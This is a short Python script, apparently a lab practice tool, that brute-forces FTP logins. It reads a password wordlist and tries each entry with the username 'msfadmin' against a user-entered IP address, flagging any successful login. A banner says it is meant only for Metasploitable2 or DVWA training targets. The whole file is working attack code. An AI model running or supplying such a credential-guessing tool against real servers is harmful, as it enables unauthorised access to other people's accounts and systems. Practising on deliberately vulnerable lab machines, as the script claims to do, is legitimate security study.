from ftplib import FTP

ascii_art = """
 ____  ____  _   _ _____ _____   _____ ___  ____   ____ _____             
| __ )|  _ \| | | |_   _| ____| |  ___/ _ \|  _ \ / ___| ____|            
|  _ \| |_) | | | | | | |  _|   | |_ | | | | |_) | |   |  _|              
| |_) |  _ <| |_| | | | | |___  |  _|| |_| |  _ <| |___| |___             
|____/|_| \_\\___/  |_| |_____| |_| _ \___/|_|_\_\\____|_____|      ____  
 _ __ ___   ___  __ _| |_ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \/ _` | __/ __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ (_| | |_\__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__,_|\__|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____| made by MadMatrix
                             |_|                                          
"""

def bruteforce(ip, user, password):
    try:
        ftp = FTP(ip)
        print(f"ID : {user} PASSWORD : {password}")
        res = ftp.login(user, password)
        if "230" in res and "successful" in res:
            print("[+]  FIND PASSWORD !!!")
        print(res)
        ftp.quit()

    except Exception as ex:
        print(f"connect error: {ex}")

def display_welcome():
    print(ascii_art)
    print("\nonly meatsploitable2 or dvwa\n")

def main():
    display_welcome()

    ip = input("Please enter the IP address: ").strip()
    password_file = '.venv/password.txt'

    try:
        with open(password_file, 'r') as password_file:
            passwords = password_file.readlines()

        for password in passwords:
            password = password.strip()
            # For demonstration, assuming a single username 'msfadmin' for brute force
            bruteforce(ip, 'msfadmin' , password)

    except FileNotFoundError:
        print(f"Error: {password_file} Error: File not found .")

if __name__ == '__main__':
    main()





